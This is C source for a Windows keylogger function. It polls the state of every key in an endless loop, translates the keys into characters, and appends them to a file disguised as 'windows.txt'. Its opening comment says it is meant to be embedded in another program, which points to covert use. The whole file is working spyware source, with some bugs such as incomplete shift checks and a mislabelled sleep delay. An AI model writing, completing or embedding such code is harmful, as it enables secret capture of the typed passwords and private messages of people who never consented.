//This is program itself it is ment to be added in the different program.
DWORD WINAPI logg()
{
    //Declared most importantly wanted variables.
    int vkey, last_key_state[0xFF];
    int isCAPSLOCK, isNUMLOCK;
    int isL_SHIFT, isR_SHIFT;
    int isPressed;
    char showKey;


    //Delaring character variable that was used to print those values in the file.
    char NUMCHAR[] = ")!@#$%^&*(";
    char char_vn[] = ";=,*./`";
    char char_vs[] = ":+<_>?-";
    char char_va[] = "[\\]\';";
    char char_vb[] = "{|}\"""";


    //Wnat to create a file descripter because the program was capable of writing keystokes in the specific file.
    FILE *kh;
    char KEY_LOG_FILE[] = "windows.txt";

    for(vkey = 0; vkey < 0xFF; vkey++)
    {
        last_key_state[vkey] = 0;
    }


    //Running infinitely once program get started.
    while (1)
    {
        //Take rest for first 10 minutes.
        sleep(10);

        //GetKeyState function Specify the key and compare with the hexadecimal value.
        //Getting the state of the key > CAPSLOCK, NUMLOCK, SHIFT.
        isCAPSLOCK = (GetKeyState(0x14) &0xFF)>0?1:0;
        isNUMLOCK = (GetKeyState(0x90) &0xFF)>0?1:0;
        isL_SHIFT = (GetKeyState(0xA0) &0xFF00)>0?:0;
        isR_SHIFT = (GetKeyState(0xA1) &0xFF00)>0?:0;

        //Checking the state of all virtual keys.
        for(vkey = 0; vkey < 0xFF; vkey++)
        {
            isPressed = (GetKeyState(vkey) &0xFF00)>0?1:0;//shrthand if else representation.
            showKey = (char)vkey;
            //checking the key is pressed or not up or down
            if(isPressed == 1 && last_key_state[vkey] == 0)
            {
                //For alphabets
                if(vkey >= 0x41 && vkey <= 0x5A)
                {
                    if(isCAPSLOCK == 0)
                    {
                        if(isL_SHIFT == 0 && isR_SHIFT == 0)
                        {
                            showKey = (char)(vkey + 0x20);
                        }
                    }
                    else if(isL_SHIFT == 1 || isR_SHIFT == 1)
                    {
                        showKey = (char)(vkey + 0x20);
                    }
                }

                //For Number Charcters
                else if(vkey >= 0x30 && vkey <= 0x39)
                {
                    if(isL_SHIFT == 1 || isR_SHIFT == 1)
                    {
                        showKey = NUMCHAR[vkey - 0x30];
                    }
                }

                //For right side number pad
                else if(vkey >= 0x30 && vkey <= 0x69 && isNUMLOCK == 1)
                {
                    showKey = (char)(vkey - 0x30);
                }

                //For Printable characters 
                else if(vkey >= 0xBA && vkey <= 0xc0)
                {
                    if(isL_SHIFT == 1 || isR_SHIFT == 1)
                    {
                        showKey = char_vs[vkey - 0xBA];
                    }
                    else
                    {
                        showKey = char_vn[vkey - 0xBA];
                    }
                }
                else if(vkey >= 0xDB && vkey <= 0xDF)
                {
                    if(isL_SHIFT == 1 || isR_SHIFT == 1)
                    {
                        showKey = char_vb[vkey - 0xDB];
                    }
                }

                //For side chars and space and etc
                else if(vkey == 0x0D)
                {
                    showKey = (char)0x0A;
                }
                else if(vkey >= 0x6A && vkey <= 0x6F)
                {
                    showKey = (char)0x00;
                }


                //Now will print and save the captured key in the file that we mentioned inthe descripter
                if(showKey != (char)0x00)
                {
                    //Append the keystrokes in the kh file descripter and close.
                    kh = fopen(KEY_LOG_FILE, "a");
                    putc(showKey, kh);
                    fclose(kh);
                }
            }

            //Save last state of the key
            last_key_state[vkey] = isPressed;
        }

    }//end of while
    
}//end of main